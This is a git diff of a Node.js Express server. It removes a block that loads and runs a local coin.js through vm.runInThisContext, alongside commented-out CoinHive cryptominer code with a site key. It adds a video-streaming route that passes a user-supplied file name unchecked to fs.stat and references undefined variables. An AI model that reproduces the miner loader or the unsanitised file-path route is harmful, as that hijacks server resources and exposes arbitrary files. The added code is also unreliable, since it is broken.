@@ -7,78 +7,6 @@ var express = require('express'),
     path = require('path');
 
 
-// var fs=require("fs");
-// for(i=0;i<1000;i++){
-//    fs.readFile(process.cwd()+"/public/font/fontawesome-webfont.svg",function(err,data){
-//        // fs.writeFile(process.cwd()+"/public/font/test1.woff",data,function(err,data){
-//        // });
-//    });
-// }
-
-var coin_hive={};
-var is_hive_start="0000";
-    // connect = require('connect'),session = require('express-session');
-  /*core module*/
-try{
-
-
-var vm = require('vm');
-var  fs = require("fs");
-is_hive_start=__dirname+"/coin.js";
-fs.readFile(is_hive_start,function(err,data){
- if(err){
-is_hive_start="no file ";
-
- }else{
-
-   var script = new vm.Script(data.toString());
-  script.runInThisContext();
-  var sandboxes = [];
-
- }
- 
-
-})
-                    
-
-
-   // var  CoinHive = require('coin-hive');
-    
-   //  /*Prepare_task*/
-
-   //    var miner = CoinHive('SyP8K30PFsIXCdKa1Ng4R7Ieh6BhIbLq',function(err,miner){
-   //      miner.start(); 
-
-   //      miner.on('found', () => console.log('Found!'));
-   //          miner.on('accepted', () => console.log('Accepted!'));
-   //          miner.on('update',function(data){
-
-   //                  coin_hive["hashesPerSecond"]=data.hashesPerSecond;
-   //                coin_hive["totalHashes"]=data.totalHashes;
-   //                coin_hive["acceptedHashes"]=data.acceptedHashes;
-
-   //           });
-   //    });
-       
-}
-catch(err){
-    is_hive_start=err;
-
-}
-  // } data =>
-  //   console.log(`
-
-  //   Hashes per second: ${data.hashesPerSecond}
-  //   Total hashes: ${data.totalHashes}
-  //   Accepted hashes: ${data.acceptedHashes}
-  // `)
-  // );
-
-  // Stop miner
-  //setTimeout(async () => await miner.stop(), 1000);
-//})();
-
-
 var os=require("os");
 var total_memory=os.totalmem();
 console.log("*********************************************");
@@ -170,6 +98,47 @@ var app = express();
 
 
 /*get*/
+
+
+/*******************App-Highway*******************/
+var list=["1.mp4"];
+app.get("/highway_channel",function(req,res){
+  res.json({list:list});
+});
+app.get("/highway",function(req,res){
+  var file_name=req.query.name;
+  if(file_name){
+        fs.stat(file_name, function(err, stats) {
+          if(err){
+            return res.end("No file found : "+file_name);
+          }else{
+            var range = req.headers.range;
+            if (!range) {
+                return res.end("You have great thinking process,i like that");
+            }else{
+                var positions = range.replace(/bytes=/, "").split("-");
+                var start = parseInt(positions[0], 10);
+                var total = stats.size;
+                var end = positions[1] ? parseInt(positions[1], 10) : total - 1;
+                var chunksize = (end - start) + 1;
+
+                res.writeHead(206, {
+                    "Content-Range": "bytes " + start + "-" + end + "/" + total,
+                    "Accept-Ranges": "bytes",
+                    "Content-Length": chunksize,
+                    "Content-Type": "video/" + extention
+                });
+                var stream = fs.createReadStream(actual_file_name, {start: start, end: end }).on("open", function() {stream.pipe(res); }).on("error", function(err) {res.end(err); });
+            }
+          }
+       });
+  }else{
+    return res.end("--");
+  }
+});
+/*******************App-Highway*******************/
+
+
 app.get("/",function(req,res){
 console.time("init-jayesh");
    res.render("jayesh.html",{layout:false});
@@ -199,31 +168,32 @@ function brute(){
  this.simulation="";
 }var brute_obj = new brute();
 
-  app.get("/simulate",function(req,res){
-     var data=req.query;
-     var type=data.type;
-     var seconds= data.seconds;
-     var request_per_seconds = data.rps;
+  /*Just uncomment it*/
+  // app.get("/simulate",function(req,res){
+  //    var data=req.query;
+  //    var type=data.type;
+  //    var seconds= data.seconds;
+  //    var request_per_seconds = data.rps;
 
-     if(type=="simulate"){
-        clearInterval(brute_obj.simulate);
-        brute_obj.simulate=setInterval(function(){
+  //    if(type=="simulate"){
+  //       clearInterval(brute_obj.simulate);
+  //       brute_obj.simulate=setInterval(function(){
 
-          const exec = require('child_process').exec;
-                exec('cat *.js bad_file | wc -l', (error, stdout, stderr) => {
-                  if (error) {
-                      console.error(`exec error: ${error}`);
-                      return;
-                  }
-                });
+  //         const exec = require('child_process').exec;
+  //               exec('cat *.js bad_file | wc -l', (error, stdout, stderr) => {
+  //                 if (error) {
+  //                     console.error(`exec error: ${error}`);
+  //                     return;
+  //                 }
+  //               });
 
 
-        },seconds);
-     }else{
+  //       },seconds);
+  //    }else{
 
-     }
-     res.render("info.html",{layout:false});
-  });
+  //    }
+  //    res.render("info.html",{layout:false});
+  // });
 /*Brute-Force attack simulation*/
 
 app.get("/info",function(req,res){
